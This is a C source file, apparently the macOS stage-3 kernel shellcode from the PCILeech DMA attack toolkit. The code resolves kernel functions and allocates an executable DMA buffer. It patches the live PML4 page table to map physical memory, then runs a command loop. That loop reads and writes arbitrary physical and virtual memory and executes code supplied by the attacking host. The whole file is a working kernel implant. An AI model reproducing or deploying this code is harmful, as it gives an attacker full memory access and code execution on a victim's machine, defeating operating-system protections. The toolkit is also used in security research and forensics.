// ax64_stage3_c.c : stage3 main shellcode.
// Compatible with macOS.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

//-------------------------------------------------------------------------------
// EFI related defines below.
//-------------------------------------------------------------------------------

typedef struct PE_state {
	QWORD initialized;
	QWORD video_dummy[18];
	PVOID deviceTreeHead;
	PVOID bootArgs;
} PE_state_t, *PPE_state_t;

enum {
	EfiReservedMemoryType = 0,
	EfiLoaderCode = 1,
	EfiLoaderData = 2,
	EfiBootServicesCode = 3,
	EfiBootServicesData = 4,
	EfiRuntimeServicesCode = 5,
	EfiRuntimeServicesData = 6,
	EfiConventionalMemory = 7,
	EfiUnusableMemory = 8,
	EfiACPIReclaimMemory = 9,
	EfiACPIMemoryNVS = 10,
	EfiMemoryMappedIO = 11,
	EfiMemoryMappedIOPortSpace = 12,
	EfiPalCode = 13,
	EfiMaxMemoryType = 14
};

typedef struct tdEFI_MEMORY_RANGE {
	DWORD Type;
	DWORD Pad;
	QWORD PhysicalStart;
	QWORD VirtualStart;
	QWORD NumberOfPages;
	QWORD Attribute;
} EFI_MEMORY_RANGE, *PEFI_MEMORY_RANGE;

#define BOOT_LINE_LENGTH        1024

typedef struct tdBOOT_ARGS {
	QWORD RevisionAndVersion;
	CHAR  CommandLine[BOOT_LINE_LENGTH]; // Passed in command line 
	DWORD MemoryMap; // Physical address of memory map 
	DWORD MemoryMapSize;
	DWORD MemoryMapDescriptorSize;
	DWORD MemoryMapDescriptorVersion;
	// truncated struct members exists
} BOOT_ARGS, *PBOOT_ARGS;

//-------------------------------------------------------------------------------
// Assembly functions below.
//-------------------------------------------------------------------------------

extern BOOL LookupFunctionsDefaultOSX(QWORD qwAddrKernelBase, QWORD qwAddrFNOSX);
extern QWORD SysVCall(QWORD fn, ...);
extern VOID PageFlush();
extern QWORD GetCR3();

//-------------------------------------------------------------------------------
// General defines below.
//-------------------------------------------------------------------------------

typedef struct tdPHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdFNOSX { // function pointers to OSX functions (used in main control program)
	QWORD _kernel_map;
	QWORD _PE_state;
	QWORD IOFree;
	QWORD IOFreeContiguous;
	QWORD IOMalloc;
	QWORD IOMallocContiguous;
	QWORD IOSleep;
	QWORD memcmp;
	QWORD memcpy;
	QWORD memset;
	QWORD vm_protect;
	QWORD ReservedFutureUse[21];
} FNOSX, *PFNOSX;

#define KMDDATA_OPERATING_SYSTEM_MACOS			0x04

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 002
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of KERNEL HEADER (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] virtual address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD;				// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[20];	// [0x060] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra in-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra in-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNOSX fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

#define VM_MIN_KERNEL_ADDRESS 0xFFFFFF8000000000ULL

//-------------------------------------------------------------------------------
// Kernel module functions below.
//-------------------------------------------------------------------------------

BOOL GetMemoryMap(PKMDDATA pk, PBYTE pbBuffer4k_PhysicalMemoryRange, PQWORD pcbBuffer4k_PhysicalMemoryRange)
{
	PBOOT_ARGS ba = ((PPE_state_t)pk->fn._PE_state)->bootArgs;
	PEFI_MEMORY_RANGE pEFIr;
	PPHYSICAL_MEMORY_RANGE pmr;
	QWORD cPmr = 0, o = 0;
	SysVCall(pk->fn.memset, pbBuffer4k_PhysicalMemoryRange, 0, 4096);
	pmr = (PPHYSICAL_MEMORY_RANGE)pbBuffer4k_PhysicalMemoryRange;
	while(o < ba->MemoryMapSize) {
		pEFIr = (PEFI_MEMORY_RANGE)(VM_MIN_KERNEL_ADDRESS + ba->MemoryMap + o);
		if(pEFIr->Type < EfiMaxMemoryType && pEFIr->Type != EfiReservedMemoryType && pEFIr->Type != EfiUnusableMemory && pEFIr->Type != EfiMemoryMappedIO && pEFIr->Type != EfiMemoryMappedIOPortSpace) {
			if(cPmr && (pEFIr->PhysicalStart == pmr[cPmr - 1].BaseAddress + pmr[cPmr - 1].NumberOfBytes)) {
				pmr[cPmr - 1].NumberOfBytes += pEFIr->NumberOfPages * 0x1000;
			} else {
				pmr[cPmr].BaseAddress = pEFIr->PhysicalStart;
				pmr[cPmr].NumberOfBytes = pEFIr->NumberOfPages * 0x1000;
				cPmr++;
			}
		}
		o += ba->MemoryMapDescriptorSize;
	}
	*pcbBuffer4k_PhysicalMemoryRange = cPmr * sizeof(PHYSICAL_MEMORY_RANGE);
	return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD qwBufferOutDMA, qwBufferOutDMA_Phys;
	QWORD qwPT_PA, qwPT_VA, qwCR3;
	QWORD i, idleCount = 0;
	// 0: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_MACOS;
	if(!LookupFunctionsDefaultOSX(pk->AddrKernelBase, (QWORD)&pk->fn)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: set up mem out DMA area 4MB/16MB in lower 4GB
	pk->DMASizeBuffer = 0x1000000;
	qwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x01000000, 12, &qwBufferOutDMA_Phys);
	if(!qwBufferOutDMA) {
		pk->DMASizeBuffer = 0x00400000;
		qwBufferOutDMA = SysVCall(pk->fn.IOMallocContiguous, 0x00400000, 12, &qwBufferOutDMA_Phys);
	}
	if(!qwBufferOutDMA) {
		pk->DMASizeBuffer = 0;
		pk->_status = 0xf0000002;
		return;
	}
	if(!qwBufferOutDMA_Phys || qwBufferOutDMA_Phys > (0x100000000 - pk->DMASizeBuffer)) {
		pk->_status = 0xf0000003;
		return;
	}
	pk->DMAAddrPhysical = qwBufferOutDMA_Phys;
	pk->DMAAddrVirtual = qwBufferOutDMA;
	SysVCall(pk->fn.vm_protect, *(PQWORD)pk->fn._kernel_map, qwBufferOutDMA, pk->DMASizeBuffer, 0, 7);
	// 2: set up page tables - used to read physical memory @ 0xffffee8000000000
	qwCR3 = GetCR3();
	qwPT_VA = SysVCall(pk->fn.IOMallocContiguous, 0xA000, 12, &qwPT_PA);
	if(!qwPT_VA || (qwPT_VA & 0xfff)) {
		pk->_status = 0xf0000004;
		return;
	}
	SysVCall(pk->fn.memset, qwPT_VA, 0, 0xA000);
	for(i = 0; i < 8; i++) { // PD -> PT*8 (512*8*4k=16M)
		((PQWORD)(qwPT_VA + 0x1000))[i] = 0x0000000000000023 | (qwPT_PA + 0x1000 * (i + 2));
	}
	*(PQWORD)(qwPT_VA + 0x0000) = 0x0000000000000023 | (qwPT_PA + 0x1000); // PDPT -> PD
	*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0x0000000000000023 | qwPT_PA; // PML4 -> PDPT
	pk->ReservedKMD = qwPT_VA;
	// 3: main command loop.
	while(TRUE) {
		pk->_status = 1;
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			idleCount++;
			// thread wait after X number of idle loops - TODO: change to timing
			if(idleCount > 10000000000) {
				SysVCall(pk->fn.IOSleep, 100);
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.IOFreeContiguous, qwBufferOutDMA, 0x01000000);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			*(PQWORD)(VM_MIN_KERNEL_ADDRESS + (qwCR3 & 0x00000000fffff000) + 0xEE8) = 0;
			SysVCall(pk->fn.IOFreeContiguous, qwPT_VA, 0xA000);
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			pk->_result = GetMemoryMap(pk, (PBYTE)pk->DMAAddrVirtual, &pk->_size);
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))qwBufferOutDMA)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			for(i = 0; i < 512 * 8; i++) { // PT*8 -> Pages
				((PQWORD)(qwPT_VA + 0x2000))[i] = 0x8000000000000003 | ((pk->_address & 0x7ffffffffffff000) + 0x1000 * i);
			}
			PageFlush();
			if(KMD_CMD_READ == pk->_op) { // READ
				SysVCall(pk->fn.memcpy, qwBufferOutDMA, 0xffffee8000000000 + (pk->_address & 0xfff), pk->_size);
			} else { // WRITE
				SysVCall(pk->fn.memcpy, 0xffffee8000000000 + (pk->_address & 0xfff), qwBufferOutDMA, pk->_size);
			}
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, qwBufferOutDMA, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, qwBufferOutDMA, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		idleCount = 0;
	}
}